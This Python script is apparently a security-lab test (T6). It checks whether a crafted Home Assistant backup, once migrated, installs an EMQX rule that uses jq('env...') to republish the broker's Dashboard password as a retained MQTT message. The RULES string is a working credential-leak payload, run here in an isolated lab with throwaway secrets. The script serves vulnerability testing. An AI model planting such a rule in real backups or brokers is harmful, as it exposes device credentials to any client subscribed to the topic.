"""T6: a crafted HA backup migrates a rule whose SQL calls jq('env...'): EMQX 5.8.9's jq exposes the broker's process
environment (vendor behaviour proven in a throwaway broker: jq('env'), jq('$ENV'), jq('env.NAME') return it). On this
device that environment holds the env secrets (EMQX_DASHBOARD__DEFAULT_PASSWORD, EMQX_NODE__COOKIE). After the product
conversion, publishing to the trigger topic makes the rule republish the device's Dashboard password as a RETAINED
message that any MQTT client allowed on that topic can read. The comparison runs inside the candidate
(os:getenv), only true/false leaves it. Run: python3 -I t6_rule_jq_env.py <codebase>"""
import io
import json
import os
import secrets
import sys
import tempfile
import time
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import secrev_lab as L
import t1_datadir_acl as T1

RULES = (b'rule_engine {\n  rules {\n    secrev_env {\n      enable = true\n'
         b'      sql = "SELECT jq(\'env.EMQX_DASHBOARD__DEFAULT_PASSWORD\', \'{}\') as leak FROM \\"secrev/trigger\\""\n'
         b'      actions = [ { function = republish, args { topic = "secrev/leak", qos = 0, retain = true,'
         b' payload = "${leak}" } } ]\n    }\n  }\n}\n')
TRIGGER = 'emqx:publish(emqx_message:make(<<"secrev">>, <<"secrev/trigger">>, <<"{}">>)), io:format("WOOWPUB:ok:END").'
CHECK = ('W = os:getenv("EMQX_DASHBOARD__DEFAULT_PASSWORD"), '
         'Ms = [M || M <- ets:tab2list(emqx_retainer_message)], '
         'Leak = [x || M <- Ms, binary:match(term_to_binary(M), list_to_binary(W)) =/= nomatch], '
         'io:format("WOOWT6:retained=~B:leaked=~B:END", [length(Ms), length(Leak)]).')


def addon_tar():
    base = 'data/emqx/data/'
    return L.tar_bytes({
        'addon.json': json.dumps({'system': {'slug': 'woow-emqx', 'name': 'EMQX'}, 'version': '5.9.1',
                                  'user': {'image': 'ghcr.io/woowtech/woow-ha-emqx-amd64'}, 'state': 'stopped'}).encode(),
        'data/emqx/node.name': b'emqx@127.0.0.1\n',
        base + 'mnesia/emqx@127.0.0.1': None,
        base + 'configs/cluster.hocon': T1.HA_HOCON + RULES,
        base + 'authz/acl.conf': T1.HA_ACL,
    })


def main(codebase):
    ha_emqx = L.use(codebase)
    started = time.time()
    result = {'test': 'T6 migrated rule jq env reads this device env secrets', 'codebase': codebase, 'image': L.IMAGE,
              'network': 'none', 'store': 'labpodman (separate --root)'}
    host_dir = tempfile.mkdtemp(prefix='t6-host-', dir=os.path.join(L.SR, 'runs'))
    os.chmod(host_dir, 0o755)
    acl_host = os.path.join(host_dir, 'acl.conf')
    with open(acl_host, 'wb') as handle:
        handle.write(T1.TARGET_ACL)
    os.chmod(acl_host, 0o644)
    s_boot, s_dash = 'secrev-t6-bootstrap', 'secrev-t6-dashboard'
    for name, value in ((s_boot, b'user_id,password,is_superuser\nwoow,' + secrets.token_hex(16).encode() + b',false\n'),
                        (s_dash, secrets.token_hex(12).encode())):
        L.lab('secret', 'rm', name, check=False)
        L.lab('secret', 'create', name, '-', input=value)
    target = L.LabTarget('t6', {'configs/cluster.hocon': T1.target_hocon('/opt/emqx/etc/acl.conf')},
                         ro_files=[(acl_host, '/opt/emqx/etc/acl.conf', 'ro')],
                         secrets_spec=[f'{s_boot},type=mount,target={T1.BOOT},uid=1000,gid=1000,mode=0400',
                                       f'{s_dash},type=env,target=EMQX_DASHBOARD__DEFAULT_PASSWORD'])
    try:
        runner = L.make_runner()
        work = L.FakeWork(runner)
        inner = addon_tar()
        work.addon_member = lambda slug: slug
        work.open = lambda member: io.BytesIO(inner)
        work.addon_info = lambda slug: L.SimpleNamespace(version='5.9.1')
        app = L.SimpleNamespace(id='emqx', name='EMQX')
        staging = Path(tempfile.mkdtemp(prefix='t6-', dir=os.path.join(L.SR, 'runs')))
        with L.temp(runner) as tmp:
            try:
                ha_emqx._build_candidate(work, app, tmp, target, staging, version='5.8.9')
                result['conversion'] = 'PASSED (candidate built, all product checks green)'
            except L.BackupError as error:
                result['conversion'] = 'REFUSED: ' + error.message
            if tmp.running('emqx-new') and result['conversion'].startswith('PASSED'):
                ex = lambda c: tmp.exec('emqx-new', c, timeout=120, check=False)
                cfg = ha_emqx.read_effective_config(ex)
                result['candidate_rules'] = sorted(((cfg.get('rule_engine') or {}).get('rules') or {}))
                result['trigger'] = 'WOOWPUB:ok' in ex(['emqx', 'eval', TRIGGER]).stdout.decode(errors='replace')
                time.sleep(3)
                out = ex(['emqx', 'eval', CHECK]).stdout.decode(errors='replace')
                result['candidate'] = out.split('WOOWT6:', 1)[-1].split(':END', 1)[0] if 'WOOWT6:' in out else 'unreadable'
    finally:
        target.remove()
        for name in (s_boot, s_dash):
            L.lab('secret', 'rm', name, check=False)
    result['device_dashboard_password_republished'] = ':leaked=1' in result.get('candidate', '') or (
        ':leaked=' in result.get('candidate', '') and not result.get('candidate', '').endswith(':leaked=0'))
    result['elapsed_s'] = round(time.time() - started, 1)
    print(json.dumps(result, ensure_ascii=False, indent=1))
    L.evidence(os.path.join(L.SR, 'runs', f't6-{codebase}.json'), result)


if __name__ == '__main__':
    main(sys.argv[1])
